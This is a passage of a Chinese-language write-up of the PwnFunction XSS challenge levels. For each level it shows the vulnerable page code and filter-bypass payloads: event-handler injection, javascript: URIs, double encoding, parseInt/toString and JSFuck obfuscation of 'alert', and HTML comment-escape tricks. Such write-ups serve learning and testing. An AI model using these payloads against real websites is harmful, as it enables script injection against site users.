class=\"line\">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure>\n<p>12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt  转为x进制数的十进制数,x范围为2-36</span><br><span class=\"line\">36 = [a-z] + [0-9]</span><br><span class=\"line\">如果第一个字符不能转为进制返回nan</span><br><span class=\"line\">p = 10+16</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">进制数必须大于30，必须要大于t的进制数 t = 10 + 20</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,25)</span><br><span class=\"line\">NaN</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,26)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,27)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,36)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,29)</span><br><span class=\"line\">18361375</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">630038579</span><br><span class=\"line\">18361375..toString(29)</span><br><span class=\"line\">&#x27;promp&#x27;</span><br><span class=\"line\">630038579..toString(30)</span><br><span class=\"line\">&#x27;prompt&#x27;</span><br><span class=\"line\">r是28进制数，如果27仍是p的结果</span><br><span class=\"line\"></span><br><span class=\"line\">eval(630038579..toString(30))(1)</span><br><span class=\"line\"></span><br><span class=\"line\">eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a = eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a(1)</span><br><span class=\"line\">&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<p>F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg命名空间中使用xml语法，且xml注释和html注释一样</span><br><span class=\"line\">&quot;&gt;&lt;svg&gt;....</span><br><span class=\"line\">如果不进行命名空间切换，script无法识别html注释</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>写在最前：</p>\n<p>做 pwnfunction 时时刻注意：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">name = &quot;&lt;script&gt;alert(&#x27;I am John in an annoying alert!&#x27;)&lt;/script&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // harmless in this case</span><br><span class=\"line\">这种看似xss的方式是行不通的</span><br><span class=\"line\">HTML 5 中指定不执行由 innerHTML 插入的 &lt;script&gt; 标签。</span><br><span class=\"line\">然而，有很多不依赖 &lt;script&gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：</span><br><span class=\"line\">const name = &quot;&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // shows the alert</span><br><span class=\"line\">Copy to Clipboard</span><br><span class=\"line\">基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\"> 如果一个 &lt;div&gt;, &lt;span&gt;, 或 &lt;noembed&gt; 节点有一个文本子节点，该节点包含字符 (&amp;), (&lt;), 或 (&gt;), innerHTML 将这些字符分别返回为 &amp;amp;, &amp;lt; 和 &amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。</span><br></pre></td></tr></table></figure>\n<h2 id=\"ma-spaghet\"><a class=\"markdownIt-Anchor\" href=\"#ma-spaghet\">#</a> Ma Spaghet</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">somebody = &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&lt;script&gt;标签。</span><br><span class=\"line\">然而，有很多不依赖&lt;script&gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&lt;img&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg onload=alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jefff\"><a class=\"markdownIt-Anchor\" href=\"#jefff\">#</a> Jefff</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==\">eval() - JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=\">function.md - wangdoc/javascript-tutorial - Sourcegraph</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class=\"line\">    let ma = &quot;&quot;</span><br><span class=\"line\">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        maname.innerText = ma</span><br><span class=\"line\">    &#125;, 1000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],prompt(1))</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],&#x27;aaaaa&#x27;)</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">//eval没有tostring方法，会返回数组形式的第一个参数</span><br><span class=\"line\">如果eval的参数不是字符串，那么会原样返回。</span><br><span class=\"line\"></span><br><span class=\"line\">1&quot;;alert(1)//</span><br><span class=\"line\">1&quot;,alert(1)//</span><br><span class=\"line\">jeff=&quot;-alert(1)-&quot;</span><br><span class=\"line\">在js中-两边都是表达式，则可以执行代码</span><br><span class=\"line\">先闭合Ma name 1&quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗</span><br></pre></td></tr></table></figure>\n<h2 id=\"da-wey\"><a class=\"markdownIt-Anchor\" href=\"#da-wey\">#</a> da-wey</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class=\"line\">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class=\"line\">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">?wey=1&quot; onfocus=alert(1) autofocus//</span><br></pre></td></tr></table></figure>\n<h2 id=\"ricardo\"><a class=\"markdownIt-Anchor\" href=\"#ricardo\">#</a> ricardo</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        ricardo.submit()</span><br><span class=\"line\">    &#125;, 2000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">ricardo=javascript:alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">效果类似于这样:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot; action=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ah-thats-hawt\"><a class=\"markdownIt-Anchor\" href=\"#ah-thats-hawt\">#</a> Ah That’s Hawt</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class=\"line\">    smith = smith.replace(/[\\(\\`\\)\\\\]/g, &#x27;&#x27;)</span><br><span class=\"line\">    will.innerHTML = smith</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">过滤了()`\\  </span><br><span class=\"line\">先html实体，在url编码</span><br><span class=\"line\">或者两次url编码</span><br><span class=\"line\">payload:</span><br><span class=\"line\">markassbrownlee=&lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&gt;</span><br><span class=\"line\">markassbrownlee=&lt;a href=&quot;javascript:alert%25281%2529&quot;&gt;a </span><br><span class=\"line\">markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1</span><br><span class=\"line\">href中js可以解析url编码,%28 %29</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ligma\"><a class=\"markdownIt-Anchor\" href=\"#ligma\">#</a> Ligma</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==\">http://www.jsfuck.com/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class=\"line\">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class=\"line\">eval(balls)</span><br><span class=\"line\">jsfuck 注意编码，url中需要使用URL编码</span><br><span class=\"line\"></span><br><span class=\"line\">false       =&gt;  ![]</span><br><span class=\"line\">true        =&gt;  !![]</span><br><span class=\"line\">undefined   =&gt;  [][[]]</span><br><span class=\"line\">NaN         =&gt;  +[![]]</span><br><span class=\"line\">0           =&gt;  +[]</span><br><span class=\"line\">1           =&gt;  +!+[]</span><br><span class=\"line\">2           =&gt;  !+[]+!+[]</span><br><span class=\"line\">10          =&gt;  [+!+[]]+[+[]]</span><br><span class=\"line\">Array       =&gt;  []</span><br><span class=\"line\">Number      =&gt;  +[]</span><br><span class=\"line\">String      =&gt;  []+[]</span><br><span class=\"line\">Boolean     =&gt;  ![]</span><br><span class=\"line\">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class=\"line\">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class=\"line\">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"mafia\"><a class=\"markdownIt-Anchor\" href=\"#mafia\">#</a> mafia</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class=\"line\">mafia = mafia.slice(0, 50)</span><br><span class=\"line\">mafia = mafia.replace(/[\\`\\&#x27;\\&quot;\\+\\-\\!\\\\\\[\\]]/gi, &#x27;_&#x27;)</span><br><span class=\"line\">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class=\"line\">eval(mafia)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1:</span><br><span class=\"line\">eval(17795081..toString(36))(1)</span><br><span class=\"line\">原理：</span><br><span class=\"line\">17795081是parseInt(&quot;alert&quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来</span><br><span class=\"line\">parseInt(&quot;&quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。</span><br><span class=\"line\">36 = 10 + 26    10个数字+26个字母</span><br><span class=\"line\">alert中最大的是t，进制数为30，因此必须使用&gt;=30的进制数才能表示t</span><br><span class=\"line\">转换时使用thatNumber.toString(radix)函数。</span><br><span class=\"line\">前一篇prompt(1)详细解释过了</span><br><span class=\"line\"></span><br><span class=\"line\">payload2:</span><br><span class=\"line\">eval(location.hash.slice(1))</span><br><span class=\"line\">eval(location.hash.slice(1))#alert(1)</span><br><span class=\"line\">但这种方式需要user interaction</span><br><span class=\"line\">原理：</span><br><span class=\"line\">url.href = &#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&#x27;;</span><br><span class=\"line\">console.log(url.hash);      // #search-results-close-container</span><br><span class=\"line\"></span><br><span class=\"line\">payload3：</span><br><span class=\"line\">Function(/ALERT(1337)/.source.toLowerCase())()</span><br><span class=\"line\">利用构造函数</span><br></pre></td></tr></table></figure>\n<h2 id=\"area-51\"><a class=\"markdownIt-Anchor\" href=\"#area-51\">#</a> Area 51</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\\!\\-\\/\\#\\&amp;\\;\\%]/g, &#x27;_&#x27;);</span><br><span class=\"line\">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class=\"line\">    template.innerHTML = input;</span><br><span class=\"line\">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">分析：过滤 !-/#&amp;;% 全部被替换为_</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;a href=javascript:alert(1)&gt;aaa</span><br><span class=\"line\">只要能闭合注释，后面的基本除了script标签之外可以乱写</span><br><span class=\"line\">    </span><br><span class=\"line\">如果直接闭合，--会被替换，&gt;会被innerhtml转义</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;__&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;!-- --&gt;是多行注释，换行也不行，换行效果： ?debug=%0a&lt;svg/onload=alert(1)&gt;</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;</span><br><span class=\"line\">&lt;svg_onload=alert(1)&gt;&lt;/svg_onload=alert(1)&gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">但如果输入&lt;?&gt;  ?debug=&lt;?&gt;aaaaaaaaaaa</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><br><span class=\"line\">aaaaaaaaaaa</span><br><span class=\"line\">&lt;p&gt;&lt;/p&gt; </span><br><span class=\"line\">--&amp;gt;</span><br><span class=\"line\">注释被闭合了，注释后面输入的内容可以逃逸出来</span><br><span class=\"line\">    </span><br><span class=\"line\">在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档</span><br><span class=\"line\">解析到&lt;的时候，HTML parser 正处于 [data state]</span><br><span class=\"line\">下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]</span><br><span class=\"line\">下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt; </span><br><span class=\"line\">例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</span><br><span class=\"line\">a</span><br><span class=\"line\">aa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa&lt;</span><br><span class=\"line\">aaa&lt;!--?--&gt;</span><br><span class=\"line\">aaa&lt;!--?b--&gt;</span><br><span class=\"line\">aaa&lt;!--?bb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;c</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;cc</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;ccc</span><br><span class=\"line\">直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</span><br><span class=\"line\"></span><br><span class=\"line\">我们输入payload后：?debug=aaa&lt;?bbb&gt;ccc&lt;svg%20onload=alert(1)&gt;</span><br><span class=\"line\">首先aaa&lt;?bbb&gt;ccc 变为 aaa&lt;!--?bbb--&gt; ccc</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">&quot;ccc&quot;</span><br><span class=\"line\">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class=\"line\">成功闭合注释</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果题目没有过滤&amp;#时，存在unintended solution</span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;img title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&amp;#x3E;&quot;&gt;1</span><br><span class=\"line\"></span><br><span class=\"line\">我们可以用html实体编码闭合多行注释</span><br><span class=\"line\">但：简单的--&gt;; 并不能闭合,因为第一次的innerHTML会将&gt;进行编码为实体，第二次innerhtml时传入的是--&amp;gt;不能闭合</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义</span><br><span class=\"line\">&lt;svg&gt;&lt;b title=&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;&gt;aaa</span><br><span class=\"line\">最终在html中渲染的是</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;--&gt;&lt;svg onload=&quot;alert()&quot;&gt;&quot;&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt;</span><br><span class=\"line\">然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入[Markup declaration open state]，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&gt;让 HTML parser 进入到了[Comment End State]</span><br></pre></td></tr></table></figure>\n<h2 id=\"okboomer\"><a class=\"markdownIt-Anchor\" href=\"#okboomer\">#</a> OK，Boomer</h2>\n<p><strong>前置知识：</strong></p>\n<p>1.DOM 中内容会影响 Windows</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;btn&quot;</span>&gt;</span>click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">btn</span>)  <span class=\"comment\">//&lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只需要用 id 同名就可以拿到 html 元素</p>\n<p>也就是说除了  <code>id</code>  可以直接用  <code>window</code>  存取， <code>embed</code> ,  <code>form</code> ,  <code>img</code>  和  <code>object</code>  这四个标签用  <code>name</code>  也可以操作：</p>\n<figure class=\"highlight html\"><table><tr><td 